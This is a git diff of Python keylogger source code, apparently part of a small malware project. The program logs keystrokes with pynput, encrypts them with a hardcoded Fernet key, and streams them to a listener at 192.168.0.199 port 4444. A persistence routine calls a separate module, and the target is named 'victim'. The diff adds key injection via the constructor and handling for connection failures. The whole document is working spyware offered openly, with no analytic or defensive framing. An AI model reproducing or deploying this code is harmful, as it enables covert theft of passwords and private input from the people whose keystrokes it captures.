@@ -1,15 +1,20 @@
 from pynput.keyboard import Listener
 import socket
-import manipulate
 from cryptography.fernet import Fernet
+import sys
+import manipulate
 
 
 class Keylogger():
 
-	def __init__(self, Host, Port):
+	def __init__(self, Host, Port, crypt_key):
 
 		self.__Host = Host
 		self.__Port = Port
+		self.client = None
+		self.client_connect = False
+		self.fail = False
+		self.__crypt = crypt_key
 		self.__key_to_discard = [
 
 			"Key.esc", "Key.ctrl", "Key.alt",
@@ -18,9 +23,6 @@ class Keylogger():
 			"Key.cmdr", "Key.cmd"
 
 		]
-		self.client = None
-		self.client_connect = False
-
 
 	def connect_server(self):
 
@@ -39,8 +41,11 @@ class Keylogger():
 		except ConnectionRefusedError:
 
 			print("Could not connect to the Server")
+
 			print("Make sure the Server is listening for connection...")
 
+			self.fail = True
+		
 	def persistance(self):
 
 		manipulate.path_manipulation()
@@ -59,35 +64,45 @@ class Keylogger():
 		if keystroke:
 
 			# byte_msg = keystroke.encode('utf-8')
-			byte_msg = crypt.encrypt(keystroke.encode('utf-8'))
+			byte_msg = self.__crypt.encrypt(keystroke.encode('utf-8'))
 
 			if self.client_connect:
 
-				self.client.sendall(byte_msg)
+				try: 
+						
+						self.client.sendall(byte_msg)
+
+				except ConnectionRefusedError:
+						
+						print("Server has been disconnected")
+						self.client.close()
+						self.client_connect = False
 
 if __name__ == '__main__':
 	
 	Host = "192.168.0.199"
 	Port = 4444
-	victim = Keylogger(Host, Port)
-
-   # load the key
 	KEY = b"GLpnLBTkUsqcwT5TYpMgQT0c-W_Ust13ybM3ZK5whj8="
-	crypt = Fernet(KEY)
+	victim = Keylogger(Host, Port, KEY)
 
 	victim.persistance()
 	victim.connect_server()
 
+	if victim.fail:
+
+		print("The program is now being terminated")
+		sys.exit(1)
+
 	try:
 
 			with Listener(on_press=victim.write_to_file) as l:
-
+			
 				l.join()
 
 	except KeyboardInterrupt:
 			
 				l.stop()
-				print("Program has been terminated")
-	
+
+				print("Program has been terminated, due to keyboard interruption")
 
 
